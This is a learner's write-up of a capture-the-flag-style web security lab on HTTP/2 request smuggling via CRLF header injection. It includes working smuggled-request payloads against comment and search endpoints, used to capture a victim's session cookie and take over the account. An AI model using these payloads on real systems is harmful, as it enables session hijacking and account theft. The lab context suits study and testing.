# Practitioner Lab 137: HTTP/2 request smuggling via CRLF injection

---

This lab is vulnerable to request smuggling because the front-end server downgrades HTTP/2 requests and fails to adequately sanitize incoming headers.

To solve the lab, use an HTTP/2-exclusive request smuggling vector to gain access to another user's account. The victim accesses the home page every 15 seconds.

If you're not familiar with Burp's exclusive features for HTTP/2 testing, please refer to the documentation for details on how to use them.

![Untitled](Practitioner%20Lab%20137%20HTTP%202%20request%20smuggling%20via%20%209a500db99d144111b1a2aaf5eddeefae/Untitled.png)

This tells me its a http2 lab

![Untitled](Practitioner%20Lab%20137%20HTTP%202%20request%20smuggling%20via%20%209a500db99d144111b1a2aaf5eddeefae/Untitled%201.png)

The scanner found the type but I still want to test.

![Untitled](Practitioner%20Lab%20137%20HTTP%202%20request%20smuggling%20via%20%209a500db99d144111b1a2aaf5eddeefae/Untitled%202.png)

Using this after multiple tries I was still unable to get a 404 which leads me into confirming that its a TE

![Untitled](Practitioner%20Lab%20137%20HTTP%202%20request%20smuggling%20via%20%209a500db99d144111b1a2aaf5eddeefae/Untitled%203.png)

Even after doing this Its not really redirecting me to a 404 which makes me think that http2 is removing the Transfer-Encoding header.

My main idea now is to bypass the Tansfer encoding with the trick of using 

```
Foo: Bar\r\nTransfer-Encoding: chunked 
```

And then try sending 2 complete requests to see if maybe I can get some other requests from the user. 

If this is not possible then I will attempts to get the user request and put it in a comment or in the search bar.

After attempting this attack it did not work now my next step would be to comment it out or put it on the search bar. 

This lab took me a while, I tried to capture the request on the search and the comment too. 

I was able to finally get it in the comment.

```
Foo: bar/r/nTransfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Host: 0a0f00b904aa1a968318417d00740043.web-security-academy.net
Cookie: session=TX2zrrRJX8I8tBDBl8OyGdHd5ETU4dnw; _lab_analytics=RvQDtX6bERu0AhSCiknqQ4tbJy5J3HMFgyEzkFkXZmXdFrExJ8Wsp2etAnlFAHjt83vr0x8eYDE7x0s2Nl61LMyadcKl09M6mIpXD6LSPLbDnGB176ZFxrbWXnz5dNArVQHtwL6SnWITPM2SDTGCF5OqaL8l4M7dZkD0TyveN79refHMJxPEOsHWWxJzDvUHAJZKZl1G1ajCWvilEe7IagHP8jB6kRt7nSJGOQJxAZBDpINkpw0JrnhT9HSy9sxp
Cache-Control: max-age=0
Sec-Ch-Ua: "Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Upgrade-Insecure-Requests: 1
Origin: https://0a0f00b904aa1a968318417d00740043.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a0f00b904aa1a968318417d00740043.web-security-academy.net/post?postId=2
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Priority: u=0, i
Content-Length: 950

csrf=QPNxYy2ONCk1mN51EUxD6sq4JAzwBwLV&postId=2&name=MESSAGE&email=new%40new&website=http://yes.com&comment=NEW
```

This was the one I used and it gave me this:

![Untitled](Practitioner%20Lab%20137%20HTTP%202%20request%20smuggling%20via%20%209a500db99d144111b1a2aaf5eddeefae/Untitled%204.png)

This gave me the user cookie. 

![Untitled](Practitioner%20Lab%20137%20HTTP%202%20request%20smuggling%20via%20%209a500db99d144111b1a2aaf5eddeefae/Untitled%205.png)

After using the session cookie from the user I had access to their account. 

Here I could have used the search but tit was for some reason not working entirely how I wanted it to so I ended opting out for the comment.

![Untitled](Practitioner%20Lab%20137%20HTTP%202%20request%20smuggling%20via%20%209a500db99d144111b1a2aaf5eddeefae/Untitled%206.png)

![Untitled](Practitioner%20Lab%20137%20HTTP%202%20request%20smuggling%20via%20%209a500db99d144111b1a2aaf5eddeefae/Untitled%207.png)

This is from the search. Showing that it could have also been done.

```
session=IzeoGHbnCImzi4nYaGlCVKLiRNd5Zgtv; 
```

```
0

POST / HTTP/1.1
Host: 0adf00b404118f08811e203000d400ab.web-security-academy.net
Cookie: session=YJKtkQ3IXRi1xyStv5J4xhb6FAlHfrKY; _lab_analytics=wc77r6hVjqu7je9E99FaOC7CFfuiQIgL1knmg4eY3LBi79RWw8Z4mmdr36xjoAm0kiMRO2FjQ9BAG2OqBzLuVGugE3Z0cmhpaAk3ocu82iprST2ZN8hDGmY03Vk3X0Bb5JNx8grYh9RLXYoS5EyTNKqpgHoGcK3Zo3GKZbCgYfMmV0LrcfWx1Uu1MwqH8h5IIkxGxFym7YLs5tSpSUJ5dnbnagHmHv5RMAUgwoFMStlRtFPKQZsIozRweTb793uJ
Content-Type: application/x-www-form-urlencoded
Content-Length: 900

search=x
```

This was part of the payload I used to do this.